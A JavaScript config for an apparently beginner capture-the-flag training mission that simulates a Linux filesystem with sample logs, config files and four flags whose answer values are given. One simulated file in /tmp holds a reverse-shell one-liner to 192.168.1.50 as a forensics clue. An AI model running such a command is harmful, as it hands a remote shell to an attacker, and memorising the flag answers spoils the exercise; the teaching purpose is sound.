/* ================================================================
   LINUX-FS-01: Root Access — Config
   ================================================================
   Filesystem exploration mission. Grid cells represent directories
   instead of network nodes. No traps, no gates — pure navigation
   and file reading. 4 flags hidden across the filesystem.
   ================================================================ */

var LINUX_FS_01_CONFIG = {
    id: 'linux-fs-01',
    title: 'LINUX-FS-01 / ROOT ACCESS',
    subtitle: 'Navigate the Linux filesystem and capture all four flags.',
    category: 'linux-filesystem',
    difficulty: 1,
    inputMode: 'terminal',
    prompt: 'root@hexworth:~#',

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['root-home',  'etc-dir',   'var-log',  'usr-bin',   'wall'],
            ['empty',      'opt-dir',   'empty',    'tmp-dir',   'srv-dir'],
            ['wall',       'home-user', 'empty',    'empty',     'wall'],
            ['wall',       'wall',      'dev-dir',  'wall',      'wall']
        ]
    },

    nodes: {
        'root-home': { label: '/root',      abbr: 'ROOT', ip: '(superuser)', os: 'drwx------',  ports: ['.bashrc','.ssh/','flag1.txt'],               desc: 'Root home directory -- restricted access',            hasFlag: true,  flagFile: 'flag1.txt', flagValue: 'FLAG{r00t_4ccess_gr4nted}' },
        'etc-dir':   { label: '/etc',       abbr: 'ETC',  ip: '(configs)',   os: 'drwxr-xr-x', ports: ['passwd','shadow','hosts','crontab'],           desc: 'System configuration files',                         hasFlag: false },
        'var-log':   { label: '/var/log',   abbr: 'LOG',  ip: '(logs)',      os: 'drwxr-xr-x', ports: ['syslog','auth.log','kern.log','flag2.txt'],    desc: 'System and application log files',                   hasFlag: true,  flagFile: 'flag2.txt', flagValue: 'FLAG{l0g_4nalysis_m4ster}' },
        'usr-bin':   { label: '/usr/bin',   abbr: 'BIN',  ip: '(binaries)',  os: 'drwxr-xr-x', ports: ['python3','vim','git','curl','nmap'],            desc: 'User command binaries',                              hasFlag: false },
        'opt-dir':   { label: '/opt',       abbr: 'OPT',  ip: '(optional)',  os: 'drwxr-xr-x', ports: ['webapp/','tools/','flag3.txt'],                desc: 'Optional third-party software',                      hasFlag: true,  flagFile: 'flag3.txt', flagValue: 'FLAG{0pt_d1rectory_h1dden}' },
        'tmp-dir':   { label: '/tmp',       abbr: 'TMP',  ip: '(temp)',      os: 'drwxrwxrwt', ports: ['.hidden/','session.tmp','exploit.sh'],         desc: 'Temporary files -- world-writable',                  hasFlag: false },
        'srv-dir':   { label: '/srv',       abbr: 'SRV',  ip: '(services)',  os: 'drwxr-xr-x', ports: ['www/','ftp/','flag4.txt'],                     desc: 'Service data directory',                              hasFlag: true,  flagFile: 'flag4.txt', flagValue: 'FLAG{s3rv1ce_d4ta_f0und}' },
        'home-user': { label: '/home/user', abbr: 'USR',  ip: '(student)',   os: 'drwxr-xr-x', ports: ['Desktop/','Documents/','notes.txt'],           desc: 'Student home directory',                              hasFlag: false },
        'dev-dir':   { label: '/dev',       abbr: 'DEV',  ip: '(devices)',   os: 'drwxr-xr-x', ports: ['null','zero','random','sda1'],                 desc: 'Device special files',                                hasFlag: false }
    },

    /* File contents for cat command — keyed by cell type then filename */
    fileContents: {
        'root-home': {
            '.bashrc':    'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nexport PS1="root@hexworth:~# "\nalias ll="ls -la"\nalias rm="rm -i"',
            '.ssh/':      '[directory] authorized_keys  id_rsa  id_rsa.pub  known_hosts',
            'flag1.txt':  'FLAG{r00t_4ccess_gr4nted}'
        },
        'etc-dir': {
            'passwd':     'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nstudent:x:1000:1000:student:/home/user:/bin/bash',
            'shadow':     '[Permission denied] Cannot read /etc/shadow without elevated privileges.\nHint: You already have root access.',
            'hosts':      '127.0.0.1       localhost\n127.0.1.1       hexworth\n10.0.0.1        gateway.hexworth.local\n10.0.0.99       target.hexworth.local',
            'crontab':    '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 * * * *  root  cd / && run-parts --report /etc/cron.hourly\n25 6 * * *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n0  3 * * 0  root  /opt/tools/backup.sh >> /var/log/backup.log 2>&1'
        },
        'var-log': {
            'syslog':     'Mar  5 08:12:01 hexworth systemd[1]: Started Session 42 of user root.\nMar  5 08:12:03 hexworth kernel: [42069.123] eth0: link up\nMar  5 08:15:22 hexworth CRON[1337]: (root) CMD (/opt/tools/backup.sh)\nMar  5 08:20:01 hexworth systemd[1]: Starting Cleanup of Temporary Directories...',
            'auth.log':   'Mar  5 03:14:07 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:09 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:12 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:15 hexworth sshd[9001]: Connection closed by 192.168.1.50 port 44231 [preauth]\nMar  5 06:00:01 hexworth sshd[9200]: Accepted publickey for root from 10.0.0.1 port 22',
            'kern.log':   'Mar  5 00:00:02 hexworth kernel: [    0.000000] Linux version 6.1.0-hexworth (gcc 12.2.0)\nMar  5 00:00:02 hexworth kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz-6.1.0\nMar  5 00:00:02 hexworth kernel: [    0.523104] EXT4-fs (sda1): mounted filesystem with ordered data mode',
            'flag2.txt':  'FLAG{l0g_4nalysis_m4ster}'
        },
        'usr-bin': {
            'python3':    '[binary] Python 3.12.1 interpreter  /usr/bin/python3',
            'vim':        '[binary] Vi IMproved 9.0            /usr/bin/vim',
            'git':        '[binary] git version 2.43.0         /usr/bin/git',
            'curl':       '[binary] curl 8.5.0                 /usr/bin/curl',
            'nmap':       '[binary] Nmap 7.94                  /usr/bin/nmap'
        },
        'opt-dir': {
            'webapp/':    '[directory] index.html  app.js  config.json  .env',
            'tools/':     '[directory] backup.sh  monitor.py  deploy.sh',
            'flag3.txt':  'FLAG{0pt_d1rectory_h1dden}'
        },
        'tmp-dir': {
            '.hidden/':   '[directory] .cache  .runtime  .sock',
            'session.tmp': 'SESSION_ID=a3f8c2e1b9d04567\nUSER=www-data\nEXPIRES=1709683200\nTOKEN=eyJhbGciOiJIUzI1NiJ9.dGVzdA.abc123',
            'exploit.sh': '#!/bin/bash\n# Suspicious script found in /tmp\nbash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n# WARNING: This is a reverse shell!\n# Attacker IP: 192.168.1.50\n# Check auth.log for related login attempts'
        },
        'srv-dir': {
            'www/':       '[directory] html/  cgi-bin/  logs/  .htaccess',
            'ftp/':       '[directory] pub/  incoming/  users/',
            'flag4.txt':  'FLAG{s3rv1ce_d4ta_f0und}'
        },
        'home-user': {
            'Desktop/':   '[directory] (empty)',
            'Documents/': '[directory] homework.txt  project/  README.md',
            'notes.txt':  'TODO:\n- Check /var/log/auth.log for failed logins\n- Look for suspicious scripts in /tmp\n- Review crontab entries in /etc\n- Investigate /opt for hidden flags\n- Explore /srv service directories'
        },
        'dev-dir': {
            'null':       '[character special] /dev/null \u2014 data sink, discards all input',
            'zero':       '[character special] /dev/zero \u2014 produces continuous null bytes',
            'random':     '[character special] /dev/random \u2014 cryptographic random number generator',
            'sda1':       '[block special] /dev/sda1 \u2014 primary disk partition, 50GB, ext4'
        }
    },

    traps: [],
    gates: {},

    objectives: [
        { id: 'flag1', label: 'FLAG-1 CAPTURED -- /root/flag1.txt',    check: 'flagsFound.has("root-home")' },
        { id: 'flag2', label: 'FLAG-2 CAPTURED -- /var/log/flag2.txt', check: 'flagsFound.has("var-log")' },
        { id: 'flag3', label: 'FLAG-3 CAPTURED -- /opt/flag3.txt',     check: 'flagsFound.has("opt-dir")' },
        { id: 'flag4', label: 'FLAG-4 CAPTURED -- /srv/flag4.txt',     check: 'flagsFound.has("srv-dir")' }
    ],

    integrity: 3,

    completion: {
        title: 'ROOT ACCESS',
        subtitle: 'Filesystem explored. All flags captured.',
        storageKey: 'hexworth_operator_linuxfs01'
    }
};
